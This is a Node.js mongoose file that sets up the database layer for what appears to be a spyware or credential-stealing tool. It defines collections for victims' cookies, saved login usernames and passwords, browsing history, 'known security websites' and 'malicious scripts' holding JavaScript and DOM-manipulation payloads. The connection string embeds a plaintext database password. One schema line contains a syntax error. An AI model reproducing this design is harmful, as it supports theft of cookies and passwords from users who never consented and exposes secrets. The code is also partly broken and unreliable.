var mongoose = require ("mongoose");
var uri = 'mongodb://heroku_qk2c0q0j:i45p143m9dfcn4ocn1urpduu5c@ds037977.mlab.com:37977/heroku_qk2c0q0j';

mongoose.connect(uri, function (err, res) {//connect to db
    if (err) {
    console.log ('ERROR connecting to: ' + uri + '. ' + err);
    } else {
    console.log ('Succeeded connected to: ' + uri);
    }
  });

//TERMINOLOGY FOR MONGODB
//collection=table
//document=row
//Schemas are predefined json formats that the mongodc collections use, not all fields/values need to be filled out 
//in order to push data to db

var userStatusSchema = new mongoose.Schema({   
    id: {type: String},
    status: { type: String, enum ['Online', 'Offline']}
});
/*userStatusSchema.methods.isOnline = function(id){
    return this
}*/

var userHistorySchema = new mongoose.Schema({
    id: {type: String},
    url: { type: String},
    history: {type: [String]}
  });
  
var userCookiesSchema = new mongoose.Schema({
    id: {type: String},
    url: { type: String},
    name: {type: String},
    value: {type: String}
  });

var userLoginSchema = new mongoose.Schema({
    id: {type: String},
    url: {type: String},
    username: {type: String},
    password: {type: String}
});

var securityWebsitesSchema = new mongoose.Schema({
    url: {type: String}
});

var maliciousScriptsSchema = new mongoose.Schema({
    url: {type: String},
    javascript: {type: String},
    dom_manipulation: {type: String}
});

var onlineClientsIDS = [];

var userStatus = mongoose.model('User Status', userStatusSchema);
var userLogin = mongoose.model('Login Info', userLoginSchema);
var userCookies = mongoose.model('Cookies', userCookiesSchema);
var userHistory = mongoose.model('User History', userHistorySchema);
var securityWebsites = mongoose.model('Known Security Websites', securityWebsitesSchema);
var maliciousScripts = mongoose.model('Malicious Scripts', maliciousScriptsSchema);

